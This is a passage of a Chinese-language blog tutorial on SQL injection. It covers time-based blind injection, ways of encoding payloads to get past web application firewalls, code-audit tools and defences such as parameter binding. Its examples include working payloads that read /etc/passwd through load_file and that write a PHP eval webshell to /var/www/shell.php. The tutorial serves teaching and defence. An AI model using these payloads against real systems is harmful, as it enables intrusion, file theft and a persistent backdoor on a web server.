class="string">&#x27;, sleep(3), sleep(10));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//该类型注入测试繁琐</span></span><br></pre></td></tr></table></figure><p>SQL注入还有一种盲注的场景，注入操作不会回显在页面中。通过SLEEP/BENCHMARK函数利用时间响应的不同推断注入结果。</p><h2 id="SQL编码"><a href="#SQL编码" class="headerlink" title="#SQL编码"></a>#SQL编码</h2><p>由于WAF（web application firewall）的出现，纯原生的SQLi Payload会被系统拦截，为了bypass waf就需要对SQL语句进行各种变形。</p><ul><li>大小写编码（目前无效果）</li><li>URLENCODE编码</li><li>注释编码</li><li>特定场景字符截断(宽字节注入)</li><li>ASCII码</li></ul><p>示例:</p><p>```shell<br>#select @@version<br>index.php?id=1+uni/<strong>/on+sel/</strong>/ect+char(64)+char(64)+char(118)+char(101)+char(114)+char(115)+char(105)+char(110)+char(111)+char(110)#;</p><p>#/etc/passwd<br>index.php?id=1+union+select+load_file(0x2F6574632F706173737764)#</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="xml">## #基于SQL攻击</span></span><br><span class="line"><span class="xml">大厂的SQLi场景基本复杂，需要通过HTTP/DNS/ICMP等等方式，将执行结果传送出来；或者利用数据库特定网络或文件函数写入webshell，进行反弹请求。</span></span><br><span class="line"><span class="xml">* OOB攻击(out of band)</span></span><br><span class="line"><span class="xml">* 特性函数写入文件</span></span><br><span class="line"><span class="xml">* 执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="xml">示例：</span></span><br><span class="line"><span class="xml">```php</span></span><br><span class="line"><span class="xml">//写入shell</span></span><br><span class="line"><span class="xml">select &#x27;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="xml">&#x27; into outfile &#x27;/var/www/shell.php&#x27;;</span></span><br></pre></td></tr></table></figure><h2 id="SQLi漏洞挖掘"><a href="#SQLi漏洞挖掘" class="headerlink" title="#SQLi漏洞挖掘"></a>#SQLi漏洞挖掘</h2><p>挖掘SQLi漏洞分为黑盒模式和白盒模式，前者通过工具或手工不断测试，后者通过阅读业务代码分析具体代码逻辑。无论黑白盒模式，能发现问题方式都是好方式，如果业务代码较为复杂，需要借助半自动化工具辅助分析代码。</p><p>源码审计工具</p><ul><li>rips</li><li>graudit</li><li>AppScan Source</li></ul><p>rips审计工具目前已更新为商业版本，这里可以结合graduit工具辅助挖掘SQLi漏洞；代码审计的核心是根据编程语言特性函数(漏洞函数)及入口参数进行追溯分析。</p><h2 id="SQLi防御"><a href="#SQLi防御" class="headerlink" title="#SQLi防御"></a>#SQLi防御</h2><p>SQLi漏洞发生原因在于输入参数与业务SQL结合导致安全风险，基础业务接受的参数多为数字型和字符型。如果参数为数字型参数，可采用intval()函数强制转换参数为整型。如果参数未字符型参数，通过参数绑定的形式规避风险。</p><p>常规防御方式:</p><ul><li>intval()/addslashes()</li><li>PDO/MySQLi参数绑定</li><li>正则过滤(不严谨)</li><li>三方安全组件（taint/suhosin）</li><li>RASP机制(Runtime Application Self Protection)</li></ul><p>传统型框架thinkphp/phpcms/dedecms/discuz等框架在SQL使用上较为混乱，现代型框架Laravel/yii/cakephp/symfony等框架在SQL上统一封装，底层多为PDO/MySQLi参数绑定，基本规避SQLi的风险。但是各大Web框架都支持原生SQL的写法，So。。。挖一挖总还会有的 :)</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li>《SQL注入与防御第二版》</li><li>《SQL学习指南第二版》</li><li>silic注入指南(习科)</li><li><a href="https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf">MySQL OOB攻击</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
